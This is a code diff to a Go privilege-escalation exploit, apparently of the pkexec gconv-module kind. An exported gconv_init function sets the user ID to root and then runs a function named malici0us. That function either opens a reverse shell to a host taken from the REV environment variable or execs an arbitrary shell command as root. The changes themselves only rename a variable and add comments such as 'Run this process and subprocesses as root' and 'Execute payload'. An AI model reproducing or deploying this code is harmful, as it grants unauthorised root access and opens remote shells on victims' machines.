@@ -19,7 +19,7 @@ const path = "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:
 func malici0us() {
 
 	// Retrieve command and exploit directory from environment variables
-	payload, foundPayload := syscall.Getenv("COMMAND")
+	command, foundPayload := syscall.Getenv("COMMAND")
 	dir, foundDir := syscall.Getenv("PKDIR")
 	revShell, foundRevShell := syscall.Getenv("REV")
 	if (!foundPayload && !foundRevShell) || !foundDir {
@@ -36,7 +36,7 @@ func malici0us() {
 	if revShell != "" {
 		reverseShell(revShell)
 	} else {
-		argv := []string{"/bin/sh", "-c", fmt.Sprintf("\"%s\"", payload)}
+		argv := []string{"/bin/sh", "-c", fmt.Sprintf("\"%s\"", command)}
 		envv := []string{path}
 		syscall.Exec("/bin/sh", argv, envv)
 	}
@@ -69,6 +69,7 @@ func reverseShell(host string) {
  */
 //export gconv_init
 func gconv_init() {
+    // Run this process and subprocesses as root
 	if err := syscall.Setuid(0); err != nil {
 		log.Fatalf("setuid failed: %v", err)
 	}
@@ -82,6 +83,7 @@ func gconv_init() {
 		log.Fatalf("Psetegid failed: %v", err)
 	}
 
+    // Execute payload
 	malici0us()
 }
 
